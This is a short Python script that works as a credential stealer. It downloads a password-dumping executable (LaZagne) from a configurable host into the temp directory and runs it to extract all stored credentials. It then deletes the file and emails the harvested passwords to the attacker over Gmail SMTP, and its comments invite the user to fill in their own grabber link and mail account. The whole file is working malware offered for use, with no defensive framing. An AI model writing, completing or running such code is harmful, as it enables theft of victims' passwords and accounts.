import requests, smtplib, tempfile, os, subprocess

def download_file(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as file:
        file.write(response.content)

def send_mail(email, password, message):
    smtp = smtplib.SMTP("smtp.gmail.com", 587)
    smtp.starttls()
    smtp.login(email, password)
    smtp.sendmail(email,email,message)
    smtp.quit()

def get_creds():
    tempdir = tempfile.gettempdir()
    os.chdir(tempdir)
    url = "http://192.168.56.1/lazagne-c.exe"           # REPLACE WITH YOUR PASSWORD GRABBER LINK.[Direct Download Link]
    download_file(url)
    file_name = url.split("/")[-1]
    result = subprocess.check_output(f"{file_name} all", shell=True)
    os.remove(file_name)
    return result.decode()

def launch_attack():
    logs = get_creds()
    send_mail("YOUR MAIL", "PASSWORD", logs)            # FILL YOUR EMAIL AND PASSWORD.

launch_attack()
